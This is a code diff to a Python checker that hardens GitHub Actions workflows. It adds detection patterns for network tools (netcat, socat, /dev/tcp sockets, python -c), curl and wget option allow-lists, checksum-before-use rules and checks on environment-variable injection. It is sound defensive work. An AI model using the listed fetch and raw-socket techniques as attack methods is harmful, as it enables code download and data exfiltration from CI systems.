@@ -616,6 +616,7 @@ class Report:
         self.errors: List[str] = []
         self.root: Optional[Path] = None  # the tree being checked (local actions are read from it)
         self.walked: set = set()  # resolved local-action directories already walked (Round 6, R4-3)
+        self.heights: Dict[Path, int] = {}  # Round 7 (N6): the height of the chain below each walked local action
 
     def bad(self, msg: str) -> None:
         self.errors.append(msg)
@@ -1253,12 +1254,46 @@ SHA_USES_RE = re.compile(r"[^@\s]+@[0-9a-f]{40}")
 TAINT_ENV_RE = re.compile(r"\$\{?GITHUB_(?:HEAD_REF|REF_NAME|REF|BASE_REF|EVENT_PATH|ACTOR|TRIGGERING_ACTOR)(?![A-Za-z0-9_])")
 # Case-folded and matched anywhere in a word (also inside `sh -c '...'`): a false positive only makes a step
 # subject to the allow-list, never exempt from it.
-FETCH_WORD_RE = re.compile(r"(?<![\w.-])(?:curl|wget|Invoke-WebRequest|iwr|git\s+clone)(?![\w-])", re.I)
+FETCH_WORD_RE = re.compile(
+    r"(?<![\w.-])(?:curl|wget|Invoke-WebRequest|iwr|Invoke-RestMethod|irm|Start-BitsTransfer|DownloadFile|git\s+clone|"
+    r"urllib\w*|http\.client|httplib|requests|aria2c|axel|nc|ncat|netcat|socat|telnet|ssh|scp|sftp|rsync|ftp)(?![\w-])", re.I)
+# Round 7 (F5): fetching commands that no single word names (`gh release download`, `docker run`, `python -c`).
+FETCH_PHRASE_RE = re.compile(
+    r"(?<![\w.-])(?:gh\s+(?:release\s+download|run\s+download|repo\s+clone)|(?:docker|podman)\s+(?:run|pull|create)|"
+    r"python[0-9.]*\s+-[cm])(?![\w-])")
+FETCH_GH = frozenset((("release", "download"), ("run", "download"), ("repo", "clone"), ("gist", "clone"), ("extension", "install")))
+PYTHON_RE = re.compile(r"python[0-9.]*")
+PY_NET_RE = re.compile(r"(?:urllib|http|requests|pip|ensurepip|socket|ftplib|smtplib|xmlrpc|telnetlib|asyncio)")
+URL_RE = re.compile(r"[A-Za-z][A-Za-z0-9+.-]*://")
+# `docker run` options that take a value, so the image is the first token that is not an option or a value.
+DOCKER_VALUE_OPTS = frozenset((
+    "-e", "--env", "-v", "--volume", "-p", "--publish", "--name", "--network", "--net", "-w", "--workdir", "-u", "--user",
+    "--entrypoint", "--env-file", "-l", "--label", "--platform", "--restart", "-h", "--hostname", "--add-host", "--mount",
+    "--cap-add", "--cap-drop", "--device", "--dns", "--memory", "-m", "--cpus", "--pull", "--log-driver", "--security-opt",
+    "--tmpfs", "--ulimit", "--shm-size", "--health-cmd", "--group-add", "--ip", "--cgroup-parent", "--stop-signal"))
 FETCH_ALLOWED = ("curl", "wget", "sha256sum", "shasum", "tar", "unzip", "mkdir", "mv", "cp", "cd", "echo", "test", "[",
                  "ls", "chmod")
 FETCH_FILE_RE = re.compile(r"GITHUB_(?:ENV|PATH)(?![A-Za-z0-9_])")  # a fetch step never edits the next steps' env or PATH
+# Round 7 (F3): a command that consumes a fetched file needs a checksum check first; these check one.
+FETCH_CONSUMERS = ("tar", "unzip", "mv", "cp", "chmod")
+FETCH_VERIFIERS = ("sha256sum", "shasum")
+# Round 7 (F5): a network connection opened by the shell itself, with no command to list.
+DEV_NET_RE = re.compile(r"/dev/(?:tcp|udp)/")
+EXEC_FD_RE = re.compile(r"\bexec\s+(?:[0-9]+|\{[A-Za-z_]\w*\})?<>")
+# Round 7 (F3): a path in a bin directory (a downloaded file there would run under an allowed command name).
+BIN_DIR_RE = re.compile(r"(?:^|[/=:~])(?:\.local/)?s?bin(?:/|$)")
+# Round 7 (N3): the options of curl and wget a fetch step may use; every other option is refused.
+CURL_SHORT_RE = re.compile(r"-(?:[fsSLv]+o?|o)")
+CURL_LONG_FLAGS = frozenset(("--fail", "--silent", "--show-error", "--location", "--fail-with-body", "--create-dirs", "--verbose"))
+CURL_LONG_VALUE = frozenset(("--output", "--retry", "--retry-delay", "--retry-max-time", "--connect-timeout", "--max-time", "--proto"))
+WGET_SHORT_FLAGS = frozenset(("-q", "-v", "-nv", "-c", "-nc", "-N"))
+WGET_SHORT_VALUE_RE = re.compile(r"-[qvcN]*[OtTP]")
+WGET_SHORT_ATTACHED_RE = re.compile(r"-[qvcN]*O(.+)")
+WGET_LONG_FLAGS = frozenset(("--quiet", "--no-verbose", "--continue", "--no-clobber", "--https-only", "--retry-connrefused"))
+WGET_LONG_VALUE = frozenset(("--output-document", "--tries", "--timeout", "--directory-prefix", "--max-redirect"))
 DANGEROUS_ASSIGN_RE = re.compile(r"LD_\w*|DYLD_\w*|BASH_ENV|ENV|PATH|IFS|PS4|CDPATH|SHELLOPTS|PYTHONPATH|PYTHONSTARTUP|"
-                                 r"NODE_OPTIONS|PERL5OPT|PERL5LIB|RUBYOPT|RUBYLIB|GIT_\w*|CURL_HOME")
+                                 r"NODE_OPTIONS|PERL5OPT|PERL5LIB|RUBYOPT|RUBYLIB|GIT_\w*|CURL_\w*|WGETRC|TAR_OPTIONS|SSL_CERT_\w+|"
+                                 r"(?i:https?_proxy|all_proxy|no_proxy)")
 TAR_FLAGS_RE = re.compile(r"-?[xzfvCjJtpmkO]+")  # no -I / --use-compress-program / --to-command / --checkpoint-action
 TAR_LONG_RE = re.compile(r"--(?:strip-components=[0-9]+|no-same-owner|no-same-permissions)")
 RUNS_ON_MATRIX_RE = re.compile(r"\$\{\{\s*matrix\.os\s*\}\}")
@@ -1276,12 +1311,19 @@ ON_PINS: Dict[str, str] = {
 
 class RunCtx:
     """What a `run:` text may name: the matrix keys of its job and the ids of its same-job steps that are safe
-    (a `run:` step, or a `uses:` step pinned by 40-hex sha) and not tainted."""
+    (a `run:` step, or a `uses:` step pinned by 40-hex sha) and not tainted. Round 7 adds the shell the steps run
+    under, whether the job runs on Windows, the image tags an earlier step built locally and the names a fetch step
+    wrote (a later step that names one must verify it)."""
 
-    def __init__(self, matrix: Iterable[str] = (), safe: Iterable[str] = (), tainted: Iterable[str] = ()) -> None:
+    def __init__(self, matrix: Iterable[str] = (), safe: Iterable[str] = (), tainted: Iterable[str] = (),
+                 default_shell: str = "", windows: bool = False, local_images: Iterable[str] = ()) -> None:
         self.matrix = frozenset(matrix)
         self.safe = frozenset(safe)
         self.tainted = frozenset(tainted)
+        self.default_shell = default_shell
+        self.windows = windows
+        self.local_images = frozenset(local_images)
+        self.fetched: set = set()
 
 
 def expr_allowed(expr: str, ctx: RunCtx) -> bool:
@@ -1305,51 +1347,109 @@ def run_text(run: Node) -> Optional[str]:
     return run.text() if run.kind == "scalar" else None
 
 
+def node_texts(node: Node) -> List[str]:
+    """The text of every scalar and block scalar at or under ``node``."""
+    texts: List[str] = []
+    for _path, sub in walk(node):
+        if sub.kind == "scalar":
+            texts.append(sub.text())
+        elif sub.kind == "block" and isinstance(sub.value, list):
+            texts.append("\n".join(sub.value))
+    return texts
+
+
+def node_exprs(node: Node) -> List[str]:
+    return [m.group(1) for t in node_texts(node) for m in EXPR_RE.finditer(t)]
+
+
 def step_exprs(step: Node) -> List[str]:
-    """Every `${{ }}` body in a step's run text and env values."""
+    """Every `${{ }}` body in a step's run text, env values and (Round 7, F1) `with:` values."""
     texts: List[str] = []
     run = step.get("run")
     body = run_text(run) if run is not None else None
     if body is not None:
         texts.append(body)
-    env = step.get("env")
-    if env is not None:
-        for _path, sub in walk(env):
-            if sub.kind == "scalar":
-                texts.append(sub.text())
-            elif sub.kind == "block" and isinstance(sub.value, list):
-                texts.append("\n".join(sub.value))
+    for key in ("env", "with"):
+        sub = step.get(key)
+        if sub is not None:
+            texts.extend(node_texts(sub))
     return [m.group(1) for t in texts for m in EXPR_RE.finditer(t)]
 
 
-def run_context(steps: Optional[Node], matrix: Iterable[str]) -> RunCtx:
-    """The safe and tainted step ids of one job (or composite action). A step that writes `$GITHUB_OUTPUT` while it
-    references a root outside the allow-list (in its env or text) is tainted, and so are the steps that read it."""
-    nodes = steps.value if steps is not None and steps.kind == "seq" and isinstance(steps.value, list) else []
-    safe: set = set()
-    writers: List[Tuple[str, Node, str]] = []
+def written_files(body: str) -> List[str]:
+    """Round 7 (N5, F1): the redirect targets of a script other than GITHUB_OUTPUT and the std streams."""
+    try:
+        targets = ShellScan(EXPR_RE.sub("$__GHX__", body)).targets
+    except ShellError:
+        return ["\0unreadable"]
+    return [t for t in targets if t and not t.isdigit() and t != "-" and "GITHUB_OUTPUT" not in t and not t.startswith("/dev/")]
+
+
+def local_image_tags(nodes: List[Node]) -> List[str]:
+    """Tags a sha-pinned docker/build-push-action step loads into the local daemon (`load: true`)."""
+    tags: List[str] = []
     for step in nodes:
-        ident = step.get("id") if step.kind == "map" else None
-        if ident is None or ident.kind != "scalar":
+        uses = step.get("uses") if step.kind == "map" else None
+        if uses is None or uses.kind != "scalar":  # an unpinned use is refused on its own, so its tags are listed too
             continue
-        sid, run, uses = ident.text().strip(), step.get("run"), step.get("uses")
+        if not uses.text().strip().lower().startswith("docker/build-push-action@"):
+            continue
+        with_ = step.get("with")
+        load, tag = (with_.get("load"), with_.get("tags")) if with_ is not None else (None, None)
+        if load is None or load.text().strip() != "true" or tag is None:
+            continue
+        for text in node_texts(tag):
+            tags.extend(t.strip() for t in re.split(r"[\s,]+", text) if t.strip())
+    return tags
+
+
+def run_context(steps: Optional[Node], matrix: Iterable[str], envs: Iterable[Optional[Node]] = (),
+                default_shell: str = "", windows: bool = False) -> RunCtx:
+    """The safe and tainted step ids of one job (or composite action). A step that writes `$GITHUB_OUTPUT` (or a
+    legacy `::set-output`) while it references a root outside the allow-list (in its env or text) is tainted, and so
+    are the steps that read it. Round 7 (N5, F1): a job or workflow `env` with a root outside the allow-list taints
+    every writer of the job; a `uses:` step with such a root in its `with:` or `env:` has tainted outputs; and a
+    writer that follows a step with such a root which wrote GITHUB_ENV / GITHUB_PATH, or a file the writer names, is
+    tainted (a value relayed through the environment or a file)."""
+    nodes = steps.value if steps is not None and steps.kind == "seq" and isinstance(steps.value, list) else []
+    images = local_image_tags(nodes)
+    base = RunCtx(matrix)
+    env_dirty = any(not expr_allowed(e, base) for env in envs if env is not None for e in node_exprs(env))
+    safe: set = set()
+    recs: List[Tuple[str, Node, str, bool]] = []
+    for step in nodes:
+        if step.kind != "map":
+            continue
+        ident = step.get("id")
+        sid = ident.text().strip() if ident is not None and ident.kind == "scalar" else ""
+        run, uses = step.get("run"), step.get("uses")
+        body = (run_text(run) or "") if run is not None else ""
+        writer = False
         if run is not None:
-            safe.add(sid)
-            body = run_text(run) or ""
-            if "GITHUB_OUTPUT" in body:
-                writers.append((sid, step, body))
+            writer = "GITHUB_OUTPUT" in body or "set-output" in body
+            if sid:
+                safe.add(sid)
         elif uses is not None and uses.kind == "scalar" and SHA_USES_RE.fullmatch(uses.text().strip()):
-            safe.add(sid)
+            writer = True
+            if sid:
+                safe.add(sid)
+        recs.append((sid, step, body, writer))
     tainted: set = set()
     changed = True
     while changed:
         changed = False
         ctx = RunCtx(matrix, safe, tainted)
-        for sid, step, body in writers:
-            if sid not in tainted and (TAINT_ENV_RE.search(body) or not all(expr_allowed(e, ctx) for e in step_exprs(step))):
+        relay, names = False, set()
+        for sid, step, body, writer in recs:
+            dirty = bool(TAINT_ENV_RE.search(body)) or not all(expr_allowed(e, ctx) for e in step_exprs(step))
+            if writer and sid and sid not in tainted and (
+                    env_dirty or dirty or relay or "\0unreadable" in names or any(n in body for n in names)):
                 tainted.add(sid)
                 changed = True
-    return RunCtx(matrix, safe, tainted)
+            if dirty and body:
+                relay = relay or FETCH_FILE_RE.search(body) is not None
+                names.update(written_files(body))
+    return RunCtx(matrix, safe, tainted, default_shell, windows, images)
 
 
 def matrix_keys(job: Node) -> List[str]:
@@ -1411,6 +1511,14 @@ class ShellLevel:
         self.paren = 0
         self.cases: List[str] = []
         self.cur: Optional[List[Tuple[str, bool]]] = None
+        self.prev = "\n"  # the separator before the next command (Round 7, F3)
+        self.neg = False  # a command that follows `if`, `elif`, `while`, `until` or `!` is a condition
+        self.stack: List[str] = []  # open if / while / until / for / case / `{` constructs
+        self.last: Optional[int] = None  # index into ShellScan.info of the command the next separator ends
+
+    def close(self) -> None:
+        if self.stack:
+            self.stack.pop()
 
 
 class ShellScan:
@@ -1427,16 +1535,23 @@ class ShellScan:
         self.assigns: List[str] = []
         self.heredocs = 0
         self.pending: List[Tuple[str, bool]] = []
+        # Round 7 (F3): per command, aligned with ``cmds``: the separators around it and whether it runs unconditionally
+        # at the top level; ``targets`` holds the redirect targets (and here-string words).
+        self.info: List[Dict[str, object]] = []
+        self.targets: List[str] = []
+        self.nest = 0
         self.scan(None)
 
     def word(self, text: str, lit: bool, lv: ShellLevel) -> None:
         self.words.append(text)
         if lv.skip:
             lv.skip = False
+            self.targets.append(text)
             return
         if lv.cases and lv.cases[-1] == "pat":
             if lit and text == "esac":
                 lv.cases.pop()
+                lv.close()
                 lv.cmd_pos = False
             return
         ex, lv.expect = lv.expect, ""
@@ -1451,6 +1566,7 @@ class ShellScan:
             return
         if ex == "case_in" and lit and text == "in":
             lv.cases.append("pat")
+            lv.stack.append("case")
             return
         if lv.wordlist:
             return
@@ -1463,26 +1579,41 @@ class ShellScan:
             self.assigns.append(m.group(1))
             return
         if lit and text in SHELL_CMD_KW:
+            if text in ("if", "elif", "while", "until", "!"):
+                lv.neg = True
+            if text in ("if", "while", "until", "{"):
+                lv.stack.append(text)
             return
         if lit and text in ("for", "select"):
             lv.expect, lv.cmd_pos = "for_var", False
+            lv.stack.append("for")
             return
         if lit and text == "case":
             lv.expect, lv.cmd_pos = "case_subj", False
             return
         if lit and text == "esac" and lv.cases:
             lv.cases.pop()
+            lv.close()
             lv.cmd_pos = False
             return
         if lit and (text in SHELL_END_KW or text in SHELL_NOOP):
+            if text in SHELL_END_KW:
+                lv.close()
             lv.cmd_pos = False
             return
         lv.cur = []
+        top = self.nest == 0 and lv.paren == 0 and not any(k in ("if", "while", "until", "case") for k in lv.stack)
+        self.info.append({"prev": lv.prev, "nxt": "", "neg": lv.neg, "top": top})
+        lv.last, lv.neg = len(self.info) - 1, False
         self.cmds.append((text, lit, lv.cur))
         lv.cmd_pos = False
 
     def separator(self, lv: ShellLevel, op: str) -> None:
         lv.cmd_pos, lv.wordlist, lv.skip, lv.expect, lv.cur = True, False, False, "", None
+        if lv.last is not None:
+            self.info[lv.last]["nxt"] = op
+            lv.last = None
+        lv.prev = op
         if op == ";;" and lv.cases:
             lv.cases[-1] = "pat"
 
@@ -1569,25 +1700,68 @@ class ShellScan:
             j += 1
         raise ShellError("unterminated `${`")
 
+    def arithmetic(self, j: int) -> bool:
+        """True when the `$((` whose body starts at ``j`` closes with an adjacent `))`; otherwise bash reads it as the
+        command substitution `$( (...) ...)` and so does the scanner."""
+        s, depth = self.s, 2
+        while j < self.n:
+            if s[j] == "(":
+                depth += 1
+            elif s[j] == ")":
+                if depth == 2 and s[j + 1:j + 2] != ")":
+                    return False
+                depth -= 1
+                if depth == 0:
+                    return True
+            j += 1
+        raise ShellError("unterminated `$((`")
+
+    def walk_arithmetic(self, i: int) -> str:
+        """Round 7 (N1): the body of `$(( ))` is walked, so a `$( )`, a backtick or a `${ }` inside it is scanned."""
+        s, j, depth = self.s, i + 3, 2
+        while j < self.n and depth:
+            c = s[j]
+            if s[j:j + 2] == "$(" and s[j:j + 3] != "$((":
+                self.i = j + 2
+                self.scan(")")
+                j = self.i
+                continue
+            if s[j:j + 2] == "${":
+                j = self.braced(j + 2)
+                continue
+            if c == "`":
+                self.i = j + 1
+                self.scan("`")
+                j = self.i
+                continue
+            if c == '"':
+                self.i = j + 1
+                self.dquote()
+                j = self.i
+                continue
+            if c == "'":
+                j = s.find("'", j + 1)
+                if j < 0:
+                    raise ShellError("unterminated quote in `$(( ))`")
+            depth += 1 if c == "(" else -1 if c == ")" else 0
+            j += 1
+        if depth:
+            raise ShellError("unterminated `$((`")
+        self.i = j
+        return "$(())"
+
     def dollar(self) -> str:
         s, i = self.s, self.i
         nxt = s[i + 1:i + 2]
-        if s[i + 1:i + 3] == "((":
-            depth, j = 2, i + 3
-            while j < self.n and depth:
-                depth += 1 if s[j] == "(" else -1 if s[j] == ")" else 0
-                j += 1
-            if depth:
-                raise ShellError("unterminated `$((`")
-            self.i = j
-            return "$(())"
+        if s[i + 1:i + 3] == "((" and self.arithmetic(i + 3):
+            return self.walk_arithmetic(i)
         if nxt == "(":
             self.i += 2
             self.scan(")")
             return "$()"
         if nxt == "{":
             self.i = self.braced(i + 2)
-            return "${}"
+            return s[i:self.i]
         if nxt.isalpha() or nxt == "_":
             j = i + 1
             while j < self.n and (s[j].isalnum() or s[j] == "_"):
@@ -1622,6 +1796,14 @@ class ShellScan:
         raise ShellError("unterminated double quote")
 
     def scan(self, closer: Optional[str]) -> None:
+        if closer is None:
+            self.walk(None)
+            return
+        self.nest += 1
+        self.walk(closer)
+        self.nest -= 1
+
+    def walk(self, closer: Optional[str]) -> None:
         s, lv = self.s, ShellLevel()
         buf: List[str] = []
         lit, have = True, False
@@ -1688,6 +1870,15 @@ class ShellScan:
                 if lv.cases and lv.cases[-1] == "pat":
                     continue
                 if not lv.cmd_pos:
+                    name = self.cmds[-1] if self.cmds else None
+                    if (name is not None and lv.cur is name[2] and not lv.cur and name[1] and lv.last is not None
+                            and re.fullmatch(r"\w+", name[0]) and re.match(r"[ \t]*\)", s[self.i:])):
+                        # `name()` opens a function definition: the name is not a command, its body is scanned in place
+                        self.cmds.pop()
+                        self.info.pop()
+                        self.i += re.match(r"[ \t]*\)", s[self.i:]).end()  # type: ignore[union-attr]
+                        lv.last, lv.cur, lv.cmd_pos = None, None, True
+                        continue
                     raise ShellError("unexpected `(`")
                 lv.paren += 1
             elif c == ")":
@@ -1714,16 +1905,125 @@ class ShellScan:
                 self.i += 1
 
 
-def fetch_problem(raw: str) -> str:
+def norm_name(text: str) -> str:
+    """A fetched or named file with `${VAR}` folded to `$VAR`, so the two spellings of one variable compare equal."""
+    return re.sub(r"\$\{(\w+)\}", r"$\1", text)
+
+
+def is_verify(word: str, args: List[Tuple[str, bool]]) -> bool:
+    """sha256sum or shasum in check mode (`-c`, `--check` or a short cluster holding `c`)."""
+    if word not in FETCH_VERIFIERS:
+        return False
+    return any(a == "--check" or (a.startswith("-") and not a.startswith("--") and "c" in a[1:]) for a, _l in args)
+
+
+def option_problem(word: str, args: List[Tuple[str, bool]], outputs: List[str]) -> str:
+    """Round 7 (N3): "" when every option of one curl or wget call is on its allow-list, else the first one that is
+    not (wget `-e` / `--use-askpass`, curl `-K` and `--config` run or read what the step did not list). The names the
+    call writes are appended to ``outputs``."""
+    curl = word == "curl"
+    n = 0
+    while n < len(args):
+        arg = args[n][0]
+        n += 1
+        if not arg.startswith("-") or arg == "-":
+            if "/" not in arg and ":" not in arg:
+                return f"the {word} argument `{arg[:40]}` (neither an allowed option nor a URL)"
+            continue
+        value: Optional[str] = None
+        want = False
+        if arg.startswith("--"):
+            name, eq, val = arg.partition("=")
+            flags, valued = (CURL_LONG_FLAGS, CURL_LONG_VALUE) if curl else (WGET_LONG_FLAGS, WGET_LONG_VALUE)
+            if name in flags and not eq:
+                continue
+            if name not in valued:
+                return f"the {word} option `{arg[:40]}`"
+            want, value = True, (val if eq else None)
+            out_opt = name in ("--output", "--output-document")
+        elif curl:
+            if CURL_SHORT_RE.fullmatch(arg) is None:
+                return f"the curl option `{arg[:40]}`"
+            want, out_opt = arg.endswith("o"), arg.endswith("o")
+        else:
+            attached = WGET_SHORT_ATTACHED_RE.fullmatch(arg)
+            if arg in WGET_SHORT_FLAGS:
+                continue
+            if attached is not None:
+                outputs.append(attached.group(1))
+                continue
+            if WGET_SHORT_VALUE_RE.fullmatch(arg) is None:
+                return f"the wget option `{arg[:40]}`"
+            want, out_opt = True, arg.endswith("O")
+        if want and value is None:
+            if n >= len(args):
+                return f"the {word} option `{arg[:40]}` with no value"
+            value = args[n][0]
+            n += 1
+        if out_opt and value is not None:
+            outputs.append(value)
+    return ""
+
+
+def docker_image(toks: List[str]) -> str:
+    """The image of `docker run|create|pull <toks>`: the first token that is not an option or an option's value."""
+    n = 0
+    while n < len(toks):
+        tok = toks[n]
+        n += 1
+        if tok.startswith("-"):
+            if "=" not in tok and tok in DOCKER_VALUE_OPTS:
+                n += 1
+            continue
+        return tok
+    return ""
+
+
+def fetch_by_command(scan: "ShellScan", ctx: Optional[RunCtx]) -> bool:
+    """Round 7 (F5): the commands that fetch without naming curl or wget: `gh release|run download`, `gh repo clone`,
+    `docker|podman run|pull|create` of an image that is neither digest-pinned nor built by an earlier step, and
+    python with `-c` or a networking `-m` module. Wrappers (`sudo`, `env`, `timeout`) are seen through."""
+    local = ctx.local_images if ctx is not None else frozenset()
+    for word, _lit, args in scan.cmds:
+        toks = [word] + [a for a, _l in args]
+        for k, tok in enumerate(toks):
+            base = tok.rsplit("/", 1)[-1]
+            rest = [t for t in toks[k + 1:] if not t.startswith("-")]
+            if base == "gh" and any(tuple(rest[i:i + 2]) in FETCH_GH for i in range(len(rest))):
+                return True
+            if base in ("docker", "podman") and rest[:1] and rest[0] in ("run", "pull", "create"):
+                image = docker_image(toks[k + 2:])
+                if not (IMAGE_DIGEST_RE.fullmatch(image) or image in local):
+                    return True
+            if PYTHON_RE.fullmatch(base):
+                tail = toks[k + 1:]
+                if "-c" in tail or any(t == "-m" and n + 1 < len(tail) and PY_NET_RE.match(tail[n + 1])
+                                       for n, t in enumerate(tail)):
+                    return True
+    return False
+
+
+def fetch_problem(raw: str, ctx: Optional[RunCtx] = None, facts: Optional[Dict[str, object]] = None) -> str:
     """Round 6 (vote 6def5ab6): "" unless ``raw`` is a fetch step (curl, wget, Invoke-WebRequest, iwr or git clone
-    in any word) that runs a command outside FETCH_ALLOWED; then the reason."""
+    in any word) that runs a command outside FETCH_ALLOWED; then the reason. Round 7 completes the allow-list: more
+    fetching words and commands count as a fetch step (F5), the options of curl and wget are listed (N3), a command
+    that consumes a fetched file needs a checksum check first (F3) and no fetched file lands in a bin directory.
+    ``facts`` receives the decoded words, the names written and whether a checksum command is present."""
     text = EXPR_RE.sub("$__GHX__", raw)
     try:
         scan = ShellScan(text)
     except ShellError as err:
-        return f"text the scanner cannot read ({err})" if FETCH_WORD_RE.search(text) else ""
+        if facts is not None:
+            facts.update(words=[norm_name(text)], outputs=[], verifier=False)
+        return f"text the scanner cannot read ({err})" if FETCH_WORD_RE.search(text) or FETCH_PHRASE_RE.search(text) else ""
+    verifier = any(w in FETCH_VERIFIERS or (w.rsplit("/", 1)[-1] == "gh" and any(a == "attestation" for a, _l in args))
+                   for w, _lit, args in scan.cmds)
+    outputs: List[str] = []
+    if facts is not None:
+        facts.update(words=[norm_name(w) for w in scan.words], outputs=outputs, verifier=verifier)
     clone = any(w == "git" and any(a == "clone" for a, _l in args) for w, _lit, args in scan.cmds)
-    if not clone and not any(FETCH_WORD_RE.search(w) for w in scan.words):
+    if not clone and not any(FETCH_WORD_RE.search(w) or FETCH_PHRASE_RE.search(w) for w in scan.words) \
+            and not fetch_by_command(scan, ctx):
         return ""
     if scan.heredocs:
         return "a here-document"
@@ -1732,9 +2032,34 @@ def fetch_problem(raw: str) -> str:
             return f"an assignment to `{name}`"
     if any(FETCH_FILE_RE.search(w) for w in scan.words):
         return "a write to GITHUB_ENV or GITHUB_PATH"
-    for word, literal, args in scan.cmds:
+    if any("${!" in w for w in scan.words):
+        return "an indirect expansion (`${!name}`)"
+    if any(w == "errexit" or re.fullmatch(r"\+[A-Za-z]*e[A-Za-z]*", w) for w in scan.words):
+        return "`set +e` (the checksum check must stop the step)"
+    for target in scan.targets:
+        if "$" in target or "`" in target:
+            return f"a redirect to the computed path `{target[:40]}`"
+    tar_dirs = set()
+    for word, _lit, args in scan.cmds:
+        for n, (arg, _l) in enumerate(args):
+            if word == "tar" and arg.startswith("-") and not arg.startswith("--") and arg.endswith("C") and n + 1 < len(args):
+                tar_dirs.add(args[n + 1][0])
+    outputs.extend(t for t in scan.targets if t and not t.isdigit() and t != "-" and not t.startswith("/dev/"))
+    for w in scan.words:
+        if w not in tar_dirs and not URL_RE.match(w) and BIN_DIR_RE.search(w):
+            return f"the system bin directory in `{w[:40]}`"
+    verified, and_verify = False, -1
+    for k, (word, literal, args) in enumerate(scan.cmds):
+        info = scan.info[k]
         if not literal or word not in FETCH_ALLOWED:
             return f"the command `{word[:40]}`"
+        if word in ("curl", "wget"):
+            reason = option_problem(word, args, outputs)
+            if reason:
+                return reason
+        if word in ("mv", "cp"):
+            plain = [a for a, _l in args if not a.startswith("-")]
+            outputs.extend(plain[-1:])
         if word == "tar":
             for n, (arg, _lit) in enumerate(args):
                 if arg.startswith("--"):
@@ -1744,7 +2069,23 @@ def fetch_problem(raw: str) -> str:
                     ok = TAR_FLAGS_RE.fullmatch(arg) is not None if ok else True
                 if not ok:
                     return f"the tar option `{arg[:40]}`"
+        if word in FETCH_CONSUMERS and not (verified or (and_verify == k - 1 and info["prev"] == "&&")):
+            return f"`{word}` before a checksum check (a top-level `sha256sum -c` or `shasum -c` must stop the step first)"
+        first = k
+        while first > 0 and scan.info[first]["prev"] == "|":  # a pipeline stands or falls with its first command
+            first -= 1
+        start = scan.info[first]
+        if is_verify(word, args) and info["top"] and not start["neg"] and start["prev"] in ("\n", ";"):
+            if info["nxt"] in ("\n", ";", ""):
+                verified = True
+            elif info["nxt"] == "&&":
+                and_verify = k
+    for out in outputs:
+        base = norm_name(out).rsplit("/", 1)[-1]
+        if base in FETCH_ALLOWED:
+            return f"a download written over the command name `{base[:40]}`"
     return ""
+
 
 
 MAX_LOCAL_DEPTH = 8  # nested local composite actions followed before a chain is refused
@@ -1769,7 +2110,7 @@ def uses_where(doc: Node, path: Tuple[str, ...]) -> str:
     return "path `" + ".".join(path) + "`"
 
 
-def check_ref(node: Node, name: str, where: str, rep: Report, exempt: bool, chain: Tuple[Path, ...]) -> None:
+def check_ref(node: Node, name: str, where: str, rep: Report, exempt: bool, chain: Tuple[Path, ...]) -> int:
     """One `uses:` value: pinned (USES_PINNED_RE), compared per action (#8030, Round 5 F1), and a local
     action is opened and inspected (Round 5 F5)."""
     ref = node.text().strip()
@@ -1777,7 +2118,7 @@ def check_ref(node: Node, name: str, where: str, rep: Report, exempt: bool, chai
         rep.bad(f"{name}: {where}: line {node.line + 1}: `uses: {ref[:70]}` is not pinned to a "
                 "full 40-hex commit sha (#6904: a tag, branch or short ref can be re-pointed)"
                 + pin_hint("USES_PINNED_RE"))
-        return
+        return 0
     # #8030 (the #6904 acceptance): where a *_USES constant exists for the action, the ref must
     # equal it exactly; another 40-hex sha is an unreviewed commit. release.yml's docker job is
     # pinned whole by DOCKER_STEPS, which already names the constant, so it is not reported twice.
@@ -1786,62 +2127,75 @@ def check_ref(node: Node, name: str, where: str, rep: Report, exempt: bool, chai
     # sha must be the allowlisted one for that key whatever spelling or subpath the ref uses.
     spec, _, sha = ref.partition("@")
     if ref.startswith("./"):
-        check_local_action(ref, node, name, where, rep, chain)
-        return
+        return check_local_action(ref, node, name, where, rep, chain)
     if spec.startswith("docker://"):
-        return
+        return 0
     segs = spec.split("/")
     if any(seg in ("", ".", "..") for seg in segs):
         rep.bad(f"{name}: {where}: line {node.line + 1}: `uses: {ref[:70]}` has an empty, `.` or "
                 "`..` path segment (a normalised path can name another action than the one reviewed)")
-        return
+        return 0
     want = USES_BY_ACTION.get("/".join(seg.lower() for seg in segs[:2]))
     if want is not None and sha != want.partition("@")[2] and not exempt:
         rep.bad(f"{name}: {where}: line {node.line + 1}: `uses: {ref[:70]}` differs from "
                 f"{USES_CONSTANTS[want]} (`{want}`; #6904: a per-action constant comparison on the "
                 "case-folded owner/repo, any subpath kept)" + pin_hint(USES_CONSTANTS[want]))
+    return 0
 
 
-def check_local_action(ref: str, node: Node, name: str, where: str, rep: Report, chain: Tuple[Path, ...]) -> None:
-    """Round 5 (F5): a local `./path` action is loaded from the checked-out tree and held to the same rules."""
+def check_local_action(ref: str, node: Node, name: str, where: str, rep: Report, chain: Tuple[Path, ...]) -> int:
+    """Round 5 (F5): a local `./path` action is loaded from the checked-out tree and held to the same rules. Round 7
+    (N6): the depth is counted on the resolved path and a walked action keeps the height of the chain below it, so an
+    action reached shallow first and deep later is refused at the deep site; the height (this action plus the deepest
+    chain below it) is returned."""
     rel = ref[2:]
     here = f"{name}: {where}: line {node.line + 1}: local action `{rel}`"
     if rep.root is None:
         rep.bad(f"{here} cannot be inspected (no checked-out tree to read it from)")
-        return
-    tree = rep.root.resolve()
-    target = (tree / rel).resolve()
+        return 0
+    try:
+        tree = rep.root.resolve()
+        target = (tree / rel).resolve()
+    except (OSError, RuntimeError):
+        rep.bad(f"{here} cannot be resolved (a symlink loop or an unreadable path)")
+        return 0
     if tree != target and tree not in target.parents:
         rep.bad(f"{here} resolves outside the checked-out tree")
-        return
+        return 0
     if target in chain:
         rep.bad(f"{here} is part of a cycle of local actions")
-        return
+        return 0
     if len(chain) >= MAX_LOCAL_DEPTH:
         rep.bad(f"{here} nests more than {MAX_LOCAL_DEPTH} local actions deep")
-        return
-    if target in rep.walked:
-        return  # Round 6 (R4-3): an action reached again by a fan-out is walked once
+        return 0
+    if target in rep.walked:  # Round 6 (R4-3): an action reached again by a fan-out is walked once
+        height = rep.heights.get(target, 1)
+        if len(chain) + height > MAX_LOCAL_DEPTH:
+            rep.bad(f"{here} nests more than {MAX_LOCAL_DEPTH} local actions deep (reached again below an earlier path; "
+                    "its own chain is counted on this one)")
+        return height
     rep.walked.add(target)
+    rep.heights[target] = 1
     action = next((target / f for f in ("action.yml", "action.yaml") if (target / f).is_file()), None)
     if action is None:
         rep.bad(f"{here} has no action.yml or action.yaml (a local action that cannot be read is not inspected)")
-        return
+        return 1
     label = f"{rel}/{action.name}"
     text = load(action, label, rep, True)
     if text is None:
-        return
